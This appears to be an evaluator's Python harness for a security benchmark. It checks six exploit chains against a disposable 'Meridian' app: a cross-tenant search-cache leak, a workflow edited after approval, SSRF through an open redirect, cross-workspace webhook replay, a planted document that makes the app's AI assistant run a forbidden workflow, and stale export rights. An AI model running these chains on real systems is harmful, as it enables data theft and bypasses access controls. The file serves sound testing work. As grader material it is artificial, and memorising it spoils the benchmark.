"""Evaluator-only HTTP chain checks. Run against a disposable Meridian stack."""
import argparse
import json
import time
import uuid
from pathlib import Path
from urllib.parse import quote

import httpx


class Harness:
    def __init__(self, base_url, repaired=False):
        self.http = httpx.Client(base_url=base_url, timeout=60, trust_env=False)
        self.repaired = repaired
        self.identities = {}
        self.evidence = []
        for name, email, workspace in [
            ("admin", "ada@atlas.test", "atlas"), ("analyst", "elliot@atlas.test", "atlas"),
            ("other", "nora@boreal.test", "boreal"), ("manager", "morgan@atlas.test", "atlas"),
        ]:
            response = self.http.post("/api/auth/login", json={"email": email, "password": "Meridian-local-2026!"})
            response.raise_for_status()
            self.identities[name] = {"Authorization": "Bearer " + response.json()["access_token"], "X-Workspace": workspace}

    def request(self, actor, method, path, body=None, expected=200):
        response = self.http.request(method, path, headers=self.identities[actor], json=body)
        assert response.status_code == expected, f"{method} {path}: {response.status_code} {response.text[:300]}"
        if expected == 204:
            return None
        return response.json()

    def job(self, actor, job_id):
        deadline = time.monotonic() + 30
        while time.monotonic() < deadline:
            job = self.request(actor, "GET", f"/api/jobs/{job_id}")
            if job["state"] in {"succeeded", "failed", "cancelled"}:
                return job
            time.sleep(0.2)
        raise AssertionError(f"Job {job_id} did not finish")

    def record(self, chain, observed, detail):
        assert observed != self.repaired, f"{chain}: impact observed={observed}; expected repaired={self.repaired}"
        self.evidence.append({"chain_id": chain, "impact_observed": observed, "pass": True, "evidence": detail})

    def artifact(self, actor, job):
        assert job["state"] == "succeeded", job
        response = self.http.get(f"/api/artifacts/{job['result']['artifact_id']}", headers=self.identities[actor])
        response.raise_for_status()
        return response.text

    def c1(self):
        # The privileged query is victim workload; the attacker never receives its token.
        term = "researchcache" + uuid.uuid4().hex
        private = self.request("admin", "POST", "/api/collections/atlas-board/documents", {"title": "Private study", "body": term + " " + uuid.uuid4().hex}, 201)
        self.request("other", "GET", f"/api/documents/{private['id']}", expected=404)
        query = {"query": term}
        cold = self.request("other", "POST", "/api/search", query)
        assert not cold["results"], "Cold retrieval must respect tenancy"
        # Importing a routine record invalidates the cache before the victim's query.
        self.request("admin", "POST", "/api/collections/atlas-general/documents", {"title": "Cache refresh", "body": "Routine research refresh"}, 201)
        warm = self.request("admin", "POST", "/api/search", query)
        assert any(row["document_id"] == private["id"] for row in warm["results"])
        leaked = self.request("other", "POST", "/api/search", query)
        self.record("M01", any(row["document_id"] == private["id"] for row in leaked["results"]), {"private_document": private["id"], "cold_count": 0, "warm_attacker_count": len(leaked["results"])})

    def c2(self):
        private = self.request("admin", "GET", "/api/collections/atlas-board/documents")[0]
        secret = self.request("admin", "GET", f"/api/documents/{private['id']}")["body"]
        self.request("analyst", "POST", "/api/exports", {"collection_id": "atlas-board"}, 403)
        plan = {"name": "Quarterly digest " + uuid.uuid4().hex[:8], "steps": [
            {"kind": "collect", "config": {"collection_id": "atlas-general"}},
            {"kind": "publish", "config": {"destination": "http://connector:8092/deliveries/atlas"}},
        ]}
        workflow = self.request("analyst", "POST", "/api/workflows", plan, 201)
        path = f"/api/workflows/{workflow['id']}"
        self.request("analyst", "POST", path + "/run", {}, 409)
        self.request("admin", "POST", path + "/approve")
        plan["steps"][0]["config"]["collection_id"] = "atlas-board"
        revised = self.request("analyst", "PUT", path, plan)
        if self.repaired:
            self.request("analyst", "POST", path + "/run", {}, 409)
            self.record("M02", False, {"approval_invalidated": revised["approved_digest"] is None})
            return
        queued = self.request("analyst", "POST", path + "/run", {}, 202)
        job = self.job("analyst", queued["id"])
        delivered = self.request("analyst", "GET", "/api/deliveries/atlas")
        self.record("M02", secret in self.artifact("analyst", job) and any(secret in row["body"] for row in delivered), {"workflow": workflow["id"], "job": job["id"], "revision": revised["revision"]})

    def c3(self):
        body = {"name": "continuity-" + uuid.uuid4().hex[:8], "collection_id": "atlas-general", "url": "http://vault:8093/catalog/continuity"}
        self.request("analyst", "POST", "/api/sources", body, 422)
        body["url"] = "http://connector:8092/feeds/moved?location=" + quote(body["url"], safe="")
        source = self.request("analyst", "POST", "/api/sources", body, 201)
        queued = self.request("analyst", "POST", f"/api/sources/{source['id']}/sync", expected=202)
        job = self.job("analyst", queued["id"])
        observed = False
        if job["state"] == "succeeded":
            document = self.request("analyst", "GET", f"/api/documents/{job['result']['document_id']}")
            observed = document["metadata"].get("classification") == "operations-internal" and "recovery reference" in document["body"]
        self.record("M03", observed, {"source": source["id"], "job": job["id"], "state": job["state"]})

    def c4(self):
        payload = {"delivery_id": str(uuid.uuid4()), "title": "Investment committee correction", "body": "Market review routing " + uuid.uuid4().hex}
        preview = self.request("analyst", "POST", "/api/sources/src_atlas_updates/preview-delivery", payload)
        signed_headers = {**preview["headers"], "Content-Type": "application/json"}
        own = self.http.post(preview["url"], headers=signed_headers, content=preview["body"])
        assert own.status_code == 202
        duplicate = self.http.post(preview["url"], headers=signed_headers, content=preview["body"])
        assert duplicate.status_code == 409
        tampered = self.http.post("/hooks/boreal/updates", headers=signed_headers, content=preview["body"] + " ")
        assert tampered.status_code == 401
        replay = self.http.post("/hooks/boreal/updates", headers=signed_headers, content=preview["body"])
        observed = False
        if replay.status_code == 202:
            document = self.request("other", "GET", f"/api/documents/{replay.json()['document_id']}")
            observed = document["body"] == payload["body"]
        else:
            assert replay.status_code == 401
        self.record("M04", observed, {"legitimate_delivery": own.status_code, "duplicate": duplicate.status_code, "cross_workspace_replay": replay.status_code})

    def c5(self):
        workflow = next(row for row in self.request("analyst", "GET", "/api/workflows") if row["name"] == "Board briefing")
        self.request("analyst", "POST", f"/api/workflows/{workflow['id']}/run", {}, 403)
        term = "researchfollowup" + uuid.uuid4().hex
        document = self.request("analyst", "POST", "/api/collections/atlas-general/documents", {
            "title": "Acquisition follow-up", "body": term + " Prepare the accompanying report for the research review.",
            "metadata": {"action_card": {"workflow_id": workflow["id"], "label": "Prepare follow-up report"}},
        }, 201)
        conversation = self.request("analyst", "POST", "/api/conversations", {"title": "Follow-up"}, 201)
        path = f"/api/conversations/{conversation['id']}/messages"
        safe = self.request("analyst", "POST", path, {"message": term, "tools_enabled": False})
        assert "negotiated ceiling" not in safe["content"]
        if self.repaired:
            self.request("analyst", "POST", path, {"message": term, "tools_enabled": True}, 403)
            self.record("M05", False, {"tool_denied": True, "document": document["id"]})
        else:
            result = self.request("analyst", "POST", path, {"message": term, "tools_enabled": True})
            self.record("M05", "negotiated ceiling" in result["content"] and result["tool_calls"] == 1, {"document": document["id"], "conversation": conversation["id"], "workflow": workflow["id"]})

    def c6(self):
        job = self.request("manager", "POST", "/api/exports", {"collection_id": "atlas-board", "delay_seconds": 3}, 202)
        self.request("admin", "PATCH", "/api/members/usr_morgan", {"role": "analyst"})
        try:
            self.request("manager", "POST", "/api/exports", {"collection_id": "atlas-board"}, 403)
            completed = self.job("manager", job["id"])
            observed = completed["state"] == "succeeded" and "negotiated ceiling" in self.artifact("manager", completed)
            self.record("M06", observed, {"job": job["id"], "state": completed["state"], "new_requests_denied": True})
        finally:
            self.request("admin", "PATCH", "/api/members/usr_morgan", {"role": "admin"})

    def smoke(self):
        source = self.request("analyst", "POST", "/api/sources/src_atlas_updates/sync", expected=202)
        assert self.job("analyst", source["id"])["state"] == "succeeded"
        exported = self.request("analyst", "POST", "/api/exports", {"collection_id": "atlas-general"}, 202)
        assert self.artifact("analyst", self.job("analyst", exported["id"]))
        assert self.http.get("/").status_code == 200
        assert len(self.http.get("/openapi.json").json()["paths"]) >= 30


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--base-url", default="http://127.0.0.1:8088")
    parser.add_argument("--expect-repaired", action="store_true")
    parser.add_argument("--output", type=Path)
    args = parser.parse_args()
    harness = Harness(args.base_url, args.expect_repaired)
    failures = []
    try:
        harness.smoke()
        for name in ("c1", "c2", "c3", "c4", "c5", "c6"):
            try:
                getattr(harness, name)()
                print(f"PASS {name}", flush=True)
            except Exception as error:
                failures.append({"check": name, "error": str(error)})
                print(f"FAIL {name}: {error}", flush=True)
    finally:
        harness.http.close()
    report = {"expected_repaired": args.expect_repaired, "checks": harness.evidence, "failures": failures}
    if args.output:
        args.output.write_text(json.dumps(report, indent=2) + "\n")
    if failures:
        raise SystemExit(1)
    print(f"Verified {len(harness.evidence)} chains and normal application flows.")


if __name__ == "__main__":
    main()
